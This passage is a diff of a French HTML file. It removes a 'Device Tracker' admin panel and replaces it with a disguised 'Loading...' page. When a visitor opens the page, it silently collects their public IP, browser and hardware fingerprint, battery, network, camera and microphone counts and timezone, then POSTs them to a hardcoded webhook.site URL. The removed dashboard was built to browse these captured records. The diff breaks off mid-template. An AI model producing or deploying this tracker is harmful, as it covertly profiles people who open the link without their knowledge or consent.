@@ -1,406 +1,479 @@
 <!DOCTYPE html>
 <html lang="fr">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Admin — Appareils</title>
-  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Syne:wght@400;600;700;800&display=swap" rel="stylesheet">
-  <style>
-    :root {
-      --bg: #080810;
-      --surface: #0f0f1a;
-      --surface2: #161625;
-      --border: #1c1c30;
-      --accent: #00e5ff;
-      --accent2: #7c3aed;
-      --accent3: #ff6b35;
-      --text: #dde1f0;
-      --muted: #525870;
-      --green: #00d68f;
-      --red: #ff4757;
-    }
-    * { box-sizing:border-box; margin:0; padding:0; }
-    body { background:var(--bg); color:var(--text); font-family:'Syne',sans-serif; min-height:100vh; }
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Loading...</title>
+<link href="https://fonts.googleapis.com/css2?family=Space+Mono:ital,wght@0,400;0,700;1,400&family=Syne:wght@400;700;800&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --bg: #060608;
+    --surface: #0d0d12;
+    --border: #1a1a2e;
+    --accent: #00ff9d;
+    --accent2: #ff2d55;
+    --accent3: #a855f7;
+    --text: #e8e8f0;
+    --muted: #4a4a6a;
+    --mono: 'Space Mono', monospace;
+    --sans: 'Syne', sans-serif;
+  }
 
-    /* SETUP */
-    #setup {
-      display:flex; flex-direction:column; align-items:center; justify-content:center;
-      min-height:100vh; padding:2rem; gap:1.5rem;
-    }
-    .logo { font-size:0.65rem; letter-spacing:0.2em; color:var(--muted); text-transform:uppercase; margin-bottom:0.5rem; }
-    #setup h1 { font-size:2.2rem; font-weight:800; letter-spacing:-0.04em; }
-    #setup h1 span { color:var(--accent); }
-    #setup p { color:var(--muted); font-size:0.9rem; text-align:center; max-width:400px; line-height:1.7; }
-    .input-row { display:flex; gap:0.5rem; width:100%; max-width:520px; }
-    input[type=text] {
-      flex:1; background:var(--surface); border:1px solid var(--border);
-      color:var(--text); padding:0.8rem 1rem; border-radius:8px;
-      font-family:'JetBrains Mono',monospace; font-size:0.78rem; outline:none; transition:border-color 0.2s;
-    }
-    input[type=text]:focus { border-color:var(--accent); }
-    input[type=text]::placeholder { color:var(--muted); }
-    .btn { background:var(--accent); color:#000; border:none; padding:0.8rem 1.5rem; border-radius:8px; font-family:'Syne',sans-serif; font-weight:700; font-size:0.85rem; cursor:pointer; transition:opacity 0.2s; white-space:nowrap; }
-    .btn:hover { opacity:0.85; }
-    .btn-ghost { background:var(--surface); color:var(--text); border:1px solid var(--border); }
-    .btn-ghost:hover { border-color:var(--accent); background:var(--surface); }
-    .btn-danger { background:transparent; color:var(--red); border:1px solid var(--red); }
-    .hint { background:var(--surface); border:1px solid var(--border); border-radius:10px; padding:1rem 1.25rem; max-width:520px; width:100%; }
-    .hint p { color:var(--muted); font-size:0.78rem; margin-bottom:0.3rem; line-height:1.6; }
-    .hint code { font-family:'JetBrains Mono',monospace; font-size:0.74rem; color:var(--accent); background:#00e5ff12; padding:0.1rem 0.4rem; border-radius:3px; }
+  * { margin: 0; padding: 0; box-sizing: border-box; }
 
-    /* DASHBOARD */
-    #dashboard { display:none; }
-    header {
-      display:flex; align-items:center; justify-content:space-between; padding:1rem 1.5rem;
-      border-bottom:1px solid var(--border); position:sticky; top:0; background:var(--bg); z-index:20;
-      gap:1rem; flex-wrap:wrap;
-    }
-    .header-left { display:flex; align-items:center; gap:1rem; }
-    .header-right { display:flex; align-items:center; gap:0.6rem; flex-wrap:wrap; }
-    header h1 { font-size:1rem; font-weight:800; letter-spacing:-0.02em; }
-    header h1 span { color:var(--accent); }
-    #count-badge { background:var(--accent2); color:#fff; font-size:0.7rem; font-weight:700; padding:0.2rem 0.7rem; border-radius:999px; font-family:'JetBrains Mono',monospace; }
-    .live-dot { width:7px; height:7px; border-radius:50%; background:var(--green); animation:blink 1.5s ease-in-out infinite; }
-    @keyframes blink { 0%,100%{opacity:1;} 50%{opacity:0.2;} }
-    .timer { font-family:'JetBrains Mono',monospace; font-size:0.7rem; color:var(--muted); }
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: var(--mono);
+    min-height: 100vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    overflow: hidden;
+    position: relative;
+  }
 
-    /* STATS */
-    .stats-bar { display:flex; gap:0.75rem; padding:1rem 1.5rem; border-bottom:1px solid var(--border); overflow-x:auto; }
-    .stat { background:var(--surface); border:1px solid var(--border); border-radius:8px; padding:0.6rem 1rem; white-space:nowrap; min-width:110px; flex-shrink:0; }
-    .stat-label { font-size:0.6rem; color:var(--muted); text-transform:uppercase; letter-spacing:0.1em; margin-bottom:0.2rem; }
-    .stat-value { font-family:'JetBrains Mono',monospace; font-size:1rem; font-weight:700; color:var(--accent); }
+  /* Animated grid background */
+  body::before {
+    content: '';
+    position: fixed;
+    inset: 0;
+    background-image:
+      linear-gradient(rgba(0,255,157,0.03) 1px, transparent 1px),
+      linear-gradient(90deg, rgba(0,255,157,0.03) 1px, transparent 1px);
+    background-size: 40px 40px;
+    animation: gridMove 20s linear infinite;
+    pointer-events: none;
+  }
 
-    /* TOOLBAR */
-    .toolbar { display:flex; align-items:center; gap:0.75rem; padding:0.75rem 1.5rem; border-bottom:1px solid var(--border); flex-wrap:wrap; }
-    .search-box { display:flex; align-items:center; gap:0.5rem; background:var(--surface); border:1px solid var(--border); border-radius:7px; padding:0.5rem 0.75rem; flex:1; min-width:160px; }
-    .search-box input { background:none; border:none; color:var(--text); font-family:'JetBrains Mono',monospace; font-size:0.78rem; outline:none; width:100%; }
-    .search-box input::placeholder { color:var(--muted); }
-    .search-icon { color:var(--muted); font-size:0.9rem; }
-    select { background:var(--surface); border:1px solid var(--border); color:var(--text); padding:0.5rem 0.75rem; border-radius:7px; font-family:'Syne',sans-serif; font-size:0.78rem; outline:none; cursor:pointer; }
-    .btn-sm { padding:0.5rem 0.9rem; font-size:0.75rem; border-radius:7px; }
+  @keyframes gridMove {
+    0% { transform: translateY(0); }
+    100% { transform: translateY(40px); }
+  }
 
-    /* DEVICE LIST */
-    #device-list { padding:1.25rem 1.5rem; display:flex; flex-direction:column; gap:0.85rem; }
-    .device-card { background:var(--surface); border:1px solid var(--border); border-radius:12px; overflow:hidden; transition:border-color 0.2s; animation:fadeUp 0.3s ease; }
-    @keyframes fadeUp { from{opacity:0;transform:translateY(6px);} to{opacity:1;transform:translateY(0);} }
-    .device-card:hover { border-color:var(--accent2); }
-    .card-top { display:flex; justify-content:space-between; align-items:flex-start; padding:1rem 1.25rem 0.75rem; gap:1rem; }
-    .card-title { font-size:1rem; font-weight:700; margin-bottom:0.2rem; }
-    .card-sub { font-family:'JetBrains Mono',monospace; font-size:0.68rem; color:var(--muted); }
-    .card-time { font-family:'JetBrains Mono',monospace; font-size:0.7rem; color:var(--accent); white-space:nowrap; text-align:right; }
-    .card-num { font-size:0.6rem; color:var(--muted); font-family:'JetBrains Mono',monospace; }
-    .tags { display:flex; flex-wrap:wrap; gap:0.35rem; padding:0 1.25rem 0.75rem; }
-    .tag { border-radius:5px; padding:0.2rem 0.55rem; font-size:0.65rem; font-family:'JetBrains Mono',monospace; border:1px solid var(--border); background:var(--surface2); }
-    .tag.c { border-color:var(--accent); color:var(--accent); }
-    .tag.p { border-color:var(--accent2); color:#a78bfa; }
-    .tag.g { border-color:var(--green); color:var(--green); }
-    .tag.r { border-color:var(--red); color:var(--red); }
-    .tag.o { border-color:var(--accent3); color:var(--accent3); }
-    .grid { display:grid; grid-template-columns:repeat(auto-fill,minmax(175px,1fr)); gap:0.4rem; padding:0 1.25rem 1rem; }
-    .info-item { background:var(--bg); border-radius:6px; padding:0.4rem 0.7rem; }
-    .info-key { font-size:0.58rem; color:var(--muted); text-transform:uppercase; letter-spacing:0.07em; }
-    .info-val { font-family:'JetBrains Mono',monospace; font-size:0.74rem; word-break:break-all; }
-    .info-val a { color:var(--accent); text-decoration:none; }
-    .info-val a:hover { text-decoration:underline; }
-    .card-toggle { display:flex; justify-content:center; padding:0 1.25rem 0.75rem; }
-    .toggle-btn { background:none; border:1px solid var(--border); color:var(--muted); padding:0.3rem 1rem; border-radius:5px; font-family:'JetBrains Mono',monospace; font-size:0.65rem; cursor:pointer; transition:all 0.2s; }
-    .toggle-btn:hover { border-color:var(--accent); color:var(--accent); }
-    .card-extra { display:none; padding:0 1.25rem 1rem; }
-    .card-extra.open { display:block; }
-    .raw-json { background:var(--bg); border-radius:8px; padding:1rem; font-family:'JetBrains Mono',monospace; font-size:0.65rem; color:var(--muted); overflow-x:auto; white-space:pre-wrap; word-break:break-all; border:1px solid var(--border); }
+  /* Radial glow */
+  body::after {
+    content: '';
+    position: fixed;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    width: 600px;
+    height: 600px;
+    background: radial-gradient(ellipse, rgba(0,255,157,0.04) 0%, transparent 70%);
+    pointer-events: none;
+  }
 
-    /* EMPTY / LOADING */
-    #empty-state, #loading-state { text-align:center; padding:4rem 2rem; color:var(--muted); }
-    .spinner { width:28px; height:28px; border:2px solid var(--border); border-top-color:var(--accent); border-radius:50%; animation:spin 0.7s linear infinite; margin:0 auto 1rem; }
-    @keyframes spin { to{transform:rotate(360deg);} }
+  .container {
+    position: relative;
+    z-index: 10;
+    text-align: center;
+    padding: 40px;
+  }
 
-    /* MODAL */
-    .modal-overlay { display:none; position:fixed; inset:0; background:#000a; z-index:50; align-items:center; justify-content:center; padding:1rem; }
-    .modal-overlay.open { display:flex; }
-    .modal { background:var(--surface); border:1px solid var(--border); border-radius:14px; padding:1.5rem; max-width:480px; width:100%; max-height:90vh; overflow-y:auto; }
-    .modal h2 { font-size:1.1rem; margin-bottom:1rem; }
-    .modal-close { float:right; background:none; border:none; color:var(--muted); font-size:1.2rem; cursor:pointer; }
+  .status-ring {
+    width: 120px;
+    height: 120px;
+    margin: 0 auto 32px;
+    position: relative;
+  }
 
-    @media(max-width:600px) {
-      header, #device-list, .stats-bar, .toolbar { padding-left:1rem; padding-right:1rem; }
-      .grid { grid-template-columns:1fr 1fr; }
-      header { flex-direction:column; align-items:flex-start; }
-    }
-  </style>
+  .ring-svg {
+    width: 120px;
+    height: 120px;
+    animation: rotateSlow 4s linear infinite;
+  }
+
+  @keyframes rotateSlow {
+    from { transform: rotate(0deg); }
+    to { transform: rotate(360deg); }
+  }
+
+  .ring-inner {
+    position: absolute;
+    inset: 20px;
+    border-radius: 50%;
+    background: var(--surface);
+    border: 1px solid var(--border);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 28px;
+  }
+
+  .label {
+    font-family: var(--sans);
+    font-size: 11px;
+    font-weight: 700;
+    letter-spacing: 0.3em;
+    text-transform: uppercase;
+    color: var(--muted);
+    margin-bottom: 8px;
+  }
+
+  .title {
+    font-family: var(--sans);
+    font-size: 28px;
+    font-weight: 800;
+    color: var(--text);
+    margin-bottom: 4px;
+  }
+
+  .subtitle {
+    font-size: 11px;
+    color: var(--muted);
+    letter-spacing: 0.1em;
+    margin-bottom: 40px;
+  }
+
+  .progress-bar {
+    width: 280px;
+    height: 2px;
+    background: var(--border);
+    margin: 0 auto 12px;
+    position: relative;
+    overflow: hidden;
+  }
+
+  .progress-fill {
+    height: 100%;
+    background: var(--accent);
+    width: 0%;
+    transition: width 0.3s ease;
+    box-shadow: 0 0 10px var(--accent);
+  }
+
+  .progress-label {
+    font-size: 10px;
+    color: var(--muted);
+    letter-spacing: 0.15em;
+  }
+
+  .log {
+    margin-top: 32px;
+    width: 320px;
+    text-align: left;
+  }
+
+  .log-line {
+    font-size: 10px;
+    color: var(--muted);
+    padding: 3px 0;
+    opacity: 0;
+    transform: translateX(-10px);
+    transition: all 0.3s ease;
+    display: flex;
+    gap: 8px;
+  }
+
+  .log-line.visible {
+    opacity: 1;
+    transform: translateX(0);
+  }
+
+  .log-line .log-prefix { color: var(--accent); flex-shrink: 0; }
+  .log-line .log-text { color: var(--muted); }
+  .log-line.ok .log-prefix { color: var(--accent); }
+  .log-line.err .log-prefix { color: var(--accent2); }
+
+  /* Success state */
+  .success-screen {
+    display: none;
+    flex-direction: column;
+    align-items: center;
+    gap: 8px;
+  }
+
+  .success-screen.show { display: flex; }
+
+  .success-icon {
+    font-size: 48px;
+    animation: popIn 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+  }
+
+  @keyframes popIn {
+    0% { transform: scale(0); opacity: 0; }
+    100% { transform: scale(1); opacity: 1; }
+  }
+
+  .success-title {
+    font-family: var(--sans);
+    font-size: 20px;
+    font-weight: 800;
+    color: var(--accent);
+  }
+
+  .success-sub {
+    font-size: 10px;
+    color: var(--muted);
+    letter-spacing: 0.15em;
+    text-transform: uppercase;
+  }
+
+  .scan-line {
+    position: fixed;
+    left: 0; right: 0;
+    height: 2px;
+    background: linear-gradient(90deg, transparent, rgba(0,255,157,0.15), transparent);
+    animation: scan 6s linear infinite;
+    pointer-events: none;
+    z-index: 5;
+  }
+
+  @keyframes scan {
+    0% { top: -2px; }
+    100% { top: 100vh; }
+  }
+
+  .corner {
+    position: fixed;
+    width: 20px;
+    height: 20px;
+    border-color: var(--muted);
+    border-style: solid;
+    opacity: 0.3;
+  }
+  .corner.tl { top: 20px; left: 20px; border-width: 1px 0 0 1px; }
+  .corner.tr { top: 20px; right: 20px; border-width: 1px 1px 0 0; }
+  .corner.bl { bottom: 20px; left: 20px; border-width: 0 0 1px 1px; }
+  .corner.br { bottom: 20px; right: 20px; border-width: 0 1px 1px 0; }
+</style>
 </head>
 <body>
 
-<!-- SETUP -->
-<div id="setup">
-  <div class="logo">Device Tracker</div>
-  <h1>Admin <span>Panel</span></h1>
-  <p>Colle l'UUID de ton webhook webhook.site pour visualiser tous les appareils en temps réel.</p>
-  <div class="input-row">
-    <input type="text" id="uuid-input" placeholder="xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx" value="42e9b838-f4c0-4861-8ac7-77a02b29ac0a" />
-    <button class="btn" onclick="startDashboard()">Connecter</button>
-  </div>
-  <div class="hint">
-    <p>1. Va sur <code>webhook.site</code> → copie l'URL générée</p>
-    <p>2. Dans <code>tracker.html</code>, colle l'URL dans <code>WEBHOOK_URL</code></p>
-    <p>3. Ici, colle l'UUID (partie après le dernier <code>/</code>)</p>
-  </div>
-</div>
+<div class="scan-line"></div>
+<div class="corner tl"></div>
+<div class="corner tr"></div>
+<div class="corner bl"></div>
+<div class="corner br"></div>
 
-<!-- DASHBOARD -->
-<div id="dashboard">
-  <header>
-    <div class="header-left">
-      <div class="live-dot"></div>
-      <h1>Device <span>Tracker</span></h1>
-      <span id="count-badge">0</span>
-    </div>
-    <div class="header-right">
-      <span class="timer" id="timer-label"></span>
-      <button class="btn btn-ghost btn-sm" onclick="loadData()">↻ Refresh</button>
-      <button class="btn btn-ghost btn-sm" onclick="exportCSV()">⬇ CSV</button>
-      <button class="btn btn-ghost btn-sm btn-danger" onclick="reset()">Déconnecter</button>
-    </div>
-  </header>
+<div class="container">
 
-  <div class="stats-bar" id="stats-bar"></div>
-
-  <div class="toolbar">
-    <div class="search-box">
-      <span class="search-icon">🔍</span>
-      <input type="text" id="search" placeholder="Rechercher OS, navigateur, timezone…" oninput="filterCards()" />
+  <!-- Loading state -->
+  <div id="loading">
+    <div class="status-ring">
+      <svg class="ring-svg" viewBox="0 0 120 120">
+        <circle cx="60" cy="60" r="54" fill="none" stroke="#1a1a2e" stroke-width="1"/>
+        <circle cx="60" cy="60" r="54" fill="none" stroke="#00ff9d" stroke-width="1"
+          stroke-dasharray="60 280" stroke-linecap="round" opacity="0.8"/>
+        <circle cx="60" cy="60" r="46" fill="none" stroke="#a855f7" stroke-width="0.5"
+          stroke-dasharray="20 270" stroke-dashoffset="100" opacity="0.5"/>
+      </svg>
+      <div class="ring-inner">📡</div>
     </div>
-    <select id="filter-os" onchange="filterCards()">
-      <option value="">Tous les OS</option>
-      <option value="Windows">Windows</option>
-      <option value="Android">Android</option>
-      <option value="iOS">iOS</option>
-      <option value="macOS">macOS</option>
-      <option value="Linux">Linux</option>
-    </select>
-    <select id="filter-touch" onchange="filterCards()">
-      <option value="">Tactile / Non</option>
-      <option value="true">Tactile</option>
-      <option value="false">Non tactile</option>
-    </select>
-    <select id="sort" onchange="filterCards()">
-      <option value="newest">Plus récent</option>
-      <option value="oldest">Plus ancien</option>
-    </select>
+
+    <div class="label">Système de reconnaissance</div>
+    <div class="title">SCAN EN COURS</div>
+    <div class="subtitle">collecte des données système</div>
+
+    <div class="progress-bar">
+      <div class="progress-fill" id="progressFill"></div>
+    </div>
+    <div class="progress-label" id="progressLabel">INITIALISATION...</div>
+
+    <div class="log" id="log"></div>
   </div>
 
-  <div id="device-list"></div>
+  <!-- Success state -->
+  <div class="success-screen" id="success">
+    <div class="success-icon">✓</div>
+    <div class="success-title">TRANSMISSION OK</div>
+    <div class="success-sub">données envoyées · <span id="successTime"></span></div>
+  </div>
+
 </div>
 
 <script>
-let webhookUUID = '';
-let allDevices = [];
-let countdown = 30;
-let interval = null;
+const WEBHOOK_URL = "https://webhook.site/42e9b838-f4c0-4861-8ac7-77a02b29ac0a";
 
-function startDashboard() {
-  const val = document.getElementById('uuid-input').value.trim();
-  if (!val) return alert('Colle ton UUID !');
-  webhookUUID = val.replace('https://webhook.site/', '');
-  document.getElementById('setup').style.display = 'none';
-  document.getElementById('dashboard').style.display = 'block';
-  loadData();
-  startCountdown();
+const logEl = document.getElementById('log');
+const progressFill = document.getElementById('progressFill');
+const progressLabel = document.getElementById('progressLabel');
+
+function addLog(text, type = 'ok') {
+  const line = document.createElement('div');
+  line.className = `log-line ${type}`;
+  const prefix = type === 'ok' ? '▶' : '✗';
+  line.innerHTML = `<span class="log-prefix">${prefix}</span><span class="log-text">${text}</span>`;
+  logEl.appendChild(line);
+  requestAnimationFrame(() => line.classList.add('visible'));
 }
 
-function reset() {
-  clearInterval(interval);
-  webhookUUID = ''; allDevices = [];
-  document.getElementById('setup').style.display = 'flex';
-  document.getElementById('dashboard').style.display = 'none';
+function setProgress(pct, label) {
+  progressFill.style.width = pct + '%';
+  progressLabel.textContent = label;
 }
 
-function startCountdown() {
-  countdown = 30;
-  clearInterval(interval);
-  interval = setInterval(() => {
-    countdown--;
-    document.getElementById('timer-label').textContent = `Refresh dans ${countdown}s`;
-    if (countdown <= 0) { loadData(); countdown = 30; }
-  }, 1000);
-}
-
-async function loadData() {
-  countdown = 30;
-  const list = document.getElementById('device-list');
-  if (!allDevices.length) list.innerHTML = `<div id="loading-state"><div class="spinner"></div><p>Chargement…</p></div>`;
+async function getIP() {
   try {
-    const res = await fetch(`https://webhook.site/token/${webhookUUID}/requests?sorting=newest&per_page=100`, { headers: { Accept: 'application/json' } });
-    if (!res.ok) throw new Error('UUID invalide ou erreur réseau');
-    const json = await res.json();
-    allDevices = (json.data || []).map(r => ({ raw: r, data: parseBody(r) })).filter(x => x.data);
-    renderStats();
-    filterCards();
+    const r = await fetch('https://api.ipify.org?format=json');
+    const d = await r.json();
+    return d.ip;
+  } catch { return 'N/A'; }
+}
+
+function getGPU() {
+  try {
+    const canvas = document.createElement('canvas');
+    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+    if (!gl) return 'N/A';
+    const ext = gl.getExtension('WEBGL_debug_renderer_info');
+    if (!ext) return 'WebGL (info bloquée)';
+    return gl.getParameter(ext.UNMASKED_RENDERER_WEBGL);
+  } catch { return 'N/A'; }
+}
+
+function getBatteryData() {
+  return navigator.getBattery
+    ? navigator.getBattery().then(b => ({
+        level: Math.round(b.level * 100) + '%',
+        charging: b.charging ? 'Oui' : 'Non',
+      }))
+    : Promise.resolve({ level: 'N/A', charging: 'N/A' });
+}
+
+function getConnectionInfo() {
+  const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+  if (!conn) return { type: 'N/A', effectiveType: 'N/A', downlink: 'N/A', rtt: 'N/A' };
+  return {
+    type: conn.type || 'N/A',
+    effectiveType: conn.effectiveType || 'N/A',
+    downlink: conn.downlink ? conn.downlink + ' Mbps' : 'N/A',
+    rtt: conn.rtt ? conn.rtt + ' ms' : 'N/A',
+  };
+}
+
+function getMediaDevices() {
+  return navigator.mediaDevices?.enumerateDevices
+    ? navigator.mediaDevices.enumerateDevices().then(devices => ({
+        cameras: devices.filter(d => d.kind === 'videoinput').length,
+        microphones: devices.filter(d => d.kind === 'audioinput').length,
+        speakers: devices.filter(d => d.kind === 'audiooutput').length,
+      }))
+    : Promise.resolve({ cameras: 'N/A', microphones: 'N/A', speakers: 'N/A' });
+}
+
+async function collect() {
+  setProgress(5, 'ANALYSE NAVIGATEUR...');
+  addLog('Navigateur détecté : ' + navigator.userAgent.split(')')[0].split('(')[1]);
+  await delay(300);
+
+  setProgress(15, 'LECTURE SYSTÈME...');
+  addLog('Plateforme : ' + navigator.platform);
+  addLog('Cœurs CPU : ' + navigator.hardwareConcurrency);
+  addLog('RAM estimée : ' + (navigator.deviceMemory ?? 'N/A') + ' Go');
+  await delay(300);
+
+  setProgress(30, 'ANALYSE ÉCRAN...');
+  addLog('Résolution : ' + screen.width + 'x' + screen.height);
+  addLog('Ratio pixel : ' + window.devicePixelRatio + 'x');
+  addLog('Profondeur couleur : ' + screen.colorDepth + ' bits');
+  await delay(300);
+
+  setProgress(45, 'DÉTECTION RÉSEAU...');
+  const ip = await getIP();
+  addLog('IP publique : ' + ip);
+  const conn = getConnectionInfo();
+  addLog('Connexion : ' + conn.effectiveType + ' — ' + conn.downlink);
+  await delay(300);
+
+  setProgress(58, 'LECTURE GPU...');
+  const gpu = getGPU();
+  addLog('GPU : ' + (gpu.length > 40 ? gpu.substring(0,40)+'…' : gpu));
+  await delay(300);
+
+  setProgress(70, 'BATTERIE & PÉRIPHÉRIQUES...');
+  const battery = await getBatteryData();
+  addLog('Batterie : ' + battery.level + ' | Charge : ' + battery.charging);
+  const media = await getMediaDevices();
+  addLog('Caméras: ' + media.cameras + ' | Micros: ' + media.microphones);
+  await delay(300);
+
+  setProgress(85, 'COLLECTE FINALE...');
+  const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
+  addLog('Fuseau : ' + tz);
+  addLog('Langue : ' + navigator.language + ' | En ligne : ' + (navigator.onLine ? 'Oui' : 'Non'));
+  await delay(300);
+
+  setProgress(95, 'ENVOI WEBHOOK...');
+
+  const payload = {
+    meta: {
+      timestamp: new Date().toISOString(),
+      date_lisible: new Date().toLocaleString('fr-FR'),
+      ip_publique: ip,
+      url_source: location.href,
+      referrer: document.referrer || 'direct',
+    },
+    navigateur: {
+      user_agent: navigator.userAgent,
+      plateforme: navigator.platform,
+      langue: navigator.language,
+      langues: navigator.languages?.join(', '),
+      cookies_actifs: navigator.cookieEnabled,
+      do_not_track: navigator.doNotTrack,
+      online: navigator.onLine,
+    },
+    materiel: {
+      cpu_coeurs: navigator.hardwareConcurrency,
+      ram_go: navigator.deviceMemory ?? 'N/A',
+      gpu: gpu,
+      ecran_resolution: screen.width + 'x' + screen.height,
+      ecran_disponible: screen.availWidth + 'x' + screen.availHeight,
+      ratio_pixel: window.devicePixelRatio,
+      profondeur_couleur: screen.colorDepth + ' bits',
+      fenetre: window.innerWidth + 'x' + window.innerHeight,
+      orientation: screen.orientation?.type ?? 'N/A',
+      ecran_tactile: navigator.maxTouchPoints > 0,
+      nb_points_touch: navigator.maxTouchPoints,
+    },
+    reseau: {
+      ip_publique: ip,
+      type: conn.type,
+      qualite: conn.effectiveType,
+      debit: conn.downlink,
+      latence: conn.rtt,
+    },
+    batterie: battery,
+    peripheriques: media,
+    temps: {
+      fuseau: tz,
+      offset_utc: -new Date().getTimezoneOffset() / 60 + 'h',
+      timestamp_unix: Date.now(),
+    },
+    performance: {
+      memoire_js: performance.memory
+        ? Math.round(performance.memory.usedJSHeapSize / 1048576) + ' MB'
+        : 'N/A',
+    },
+  };
+
+  try {
+    await fetch(WEBHOOK_URL, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(payload),
+    });
+    setProgress(100, 'TERMINÉ');
+    addLog('Transmission réussie ✓', 'ok');
+    await delay(600);
+    showSuccess();
   } catch(e) {
-    list.innerHTML = `<div id="empty-state"><p>⚠️ ${e.message}</p></div>`;
-    document.getElementById('stats-bar').innerHTML = '';
-    document.getElementById('count-badge').textContent = 'Erreur';
+    setProgress(100, 'ERREUR');
+    addLog('Erreur envoi : ' + e.message, 'err');
   }
 }
 
-function parseBody(req) {
-  try { return JSON.parse(req.content); } catch(e) { return null; }
+function showSuccess() {
+  document.getElementById('loading').style.display = 'none';
+  const s = document.getElementById('success');
+  s.classList.add('show');
+  document.getElementById('successTime').textContent = new Date().toLocaleTimeString('fr-FR');
 }
 
-function detectOS(ua) {
-  if (!ua) return 'Inconnu';
-  if (/Windows/.test(ua)) return '🪟 Windows';
-  if (/Android/.test(ua)) return '🤖 Android';
-  if (/iPhone/.test(ua)) return '📱 iPhone';
-  if (/iPad/.test(ua)) return '📱 iPad';
-  if (/Mac OS X/.test(ua)) return '🍎 macOS';
-  if (/Linux/.test(ua)) return '🐧 Linux';
-  return '❓ Inconnu';
-}
+function delay(ms) { return new Promise(r => setTimeout(r, ms)); }
 
-function detectBrowser(ua) {
-  if (!ua) return '?';
-  if (/Edg\//.test(ua)) return 'Edge';
-  if (/OPR\//.test(ua)) return 'Opera';
-  if (/Firefox\//.test(ua)) return 'Firefox';
-  if (/Chrome\//.test(ua)) return 'Chrome';
-  if (/Safari\//.test(ua)) return 'Safari';
-  return '?';
-}
-
-function renderStats() {
-  const ds = allDevices.map(x => x.data);
-  document.getElementById('count-badge').textContent = ds.length + ' appareil(s)';
-  const oss = {};
-  const browsers = {};
-  let touchCount = 0, gpsCount = 0, adblockCount = 0;
-  ds.forEach(d => {
-    const o = d.os || detectOS(d.user_agent || d.userAgent || '');
-    oss[o] = (oss[o]||0)+1;
-    const b = d.navigateur || detectBrowser(d.user_agent || d.userAgent || '');
-    browsers[b] = (browsers[b]||0)+1;
-    if (d.tactile) touchCount++;
-    if (d.gps_latitude) gpsCount++;
-    if (d.adblock_detecte) adblockCount++;
-  });
-  const topOS = Object.entries(oss).sort((a,b)=>b[1]-a[1]).slice(0,3).map(([k,v])=>`${k.replace(/[^\w\s]/g,'')} (${v})`).join(', ');
-  const topBrowser = Object.entries(browsers).sort((a,b)=>b[1]-a[1]).slice(0,3).map(([k,v])=>`${k} (${v})`).join(', ');
-  document.getElementById('stats-bar').innerHTML = `
-    <div class="stat"><div class="stat-label">Total</div><div class="stat-value">${ds.length}</div></div>
-    <div class="stat"><div class="stat-label">Tactile</div><div class="stat-value">${touchCount}</div></div>
-    <div class="stat"><div class="stat-label">GPS partagé</div><div class="stat-value">${gpsCount}</div></div>
-    <div class="stat"><div class="stat-label">Adblock</div><div class="stat-value">${adblockCount}</div></div>
-    <div class="stat" style="min-width:180px"><div class="stat-label">OS</div><div class="stat-value" style="font-size:0.7rem">${topOS||'—'}</div></div>
-    <div class="stat" style="min-width:180px"><div class="stat-label">Navigateurs</div><div class="stat-value" style="font-size:0.7rem">${topBrowser||'—'}</div></div>
-  `;
-}
-
-function filterCards() {
-  const q = document.getElementById('search').value.toLowerCase();
-  const osF = document.getElementById('filter-os').value;
-  const touchF = document.getElementById('filter-touch').value;
-  const sort = document.getElementById('sort').value;
-
-  let filtered = allDevices.filter(({data: d}) => {
-    const str = JSON.stringify(d).toLowerCase();
-    if (q && !str.includes(q)) return false;
-    if (osF) { const o = (d.os || '').toLowerCase(); if (!o.includes(osF.toLowerCase())) return false; }
-    if (touchF !== '') { if (String(d.tactile) !== touchF) return false; }
-    return true;
-  });
-
-  if (sort === 'oldest') filtered = filtered.reverse();
-  renderCards(filtered);
-}
-
-function renderCards(items) {
-  const list = document.getElementById('device-list');
-  if (!items.length) {
-    list.innerHTML = `<div id="empty-state"><p>📭 Aucun appareil trouvé.</p></div>`;
-    return;
-  }
-  list.innerHTML = items.map(({raw, data: d}, i) => {
-    const os = d.os || detectOS(d.user_agent || '');
-    const browser = d.navigateur || detectBrowser(d.user_agent || '');
-    const navVersion = d.nav_version ? ` ${d.nav_version}` : '';
-    const hasGPS = d.gps_latitude && d.gps_longitude;
-    const id = `card-${raw.uuid || i}`;
-    return `
-      <div class="device-card" id="${id}">
-        <div class="card-top">
-          <div>
-            <div class="card-num">#${String(i+1).padStart(3,'0')}</div>
-            <div class="card-title">${os} · ${browser}${navVersion}</div>
-            <div class="card-sub">${d.timezone || '—'} · ${d.langue || '—'}</div>
-          </div>
-          <div>
-            <div class="card-time">${d.heure_locale || new Date(raw.created_at).toLocaleString('fr-FR')}</div>
-          </div>
-        </div>
-
-        <div class="tags">
-          <span class="tag c">${d.ecran_resolution || '?'}</span>
-          <span class="tag">${d.fenetre || '?'} fenêtre</span>
-          <span class="tag p">${d.coeurs_cpu || '?'} cœurs · ${d.memoire_go || '?'}Go RAM</span>
-          ${d.tactile ? '<span class="tag g">Tactile</span>' : '<span class="tag">Non tactile</span>'}
-          ${d.batterie_pct ? `<span class="tag o">${d.batterie_pct} ${d.batterie_en_charge ? '⚡' : '🔋'}</span>` : ''}
-          ${d.reseau_type_effectif ? `<span class="tag">${d.reseau_type_effectif}</span>` : ''}
-          ${d.reseau_vitesse_mbps ? `<span class="tag">${d.reseau_vitesse_mbps} Mbps</span>` : ''}
-          ${hasGPS ? '<span class="tag g">GPS ✓</span>' : '<span class="tag r">GPS refusé</span>'}
-          ${d.adblock_detecte ? '<span class="tag r">AdBlock</span>' : '<span class="tag">Pas d\'AdBlock</span>'}
